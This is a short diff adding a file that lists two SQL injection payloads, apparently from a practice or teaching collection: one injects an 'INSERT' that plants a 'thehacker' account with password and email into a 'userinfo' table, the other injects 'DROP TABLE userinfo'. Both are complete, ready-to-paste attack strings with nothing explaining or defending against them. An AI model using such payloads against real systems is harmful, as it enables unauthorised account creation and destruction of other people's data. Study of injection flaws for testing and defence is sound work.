@@ -1,0 +1,5 @@
+1) Adding something to the table
+'; INSERT INTO userinfo ('Username', 'Password', 'Email') VALUES ('thehacker', '2kvLXCR', 'ugot@hacked.com'); #
+
+2) Deleting everything
+'; DROP TABLE userinfo; # 
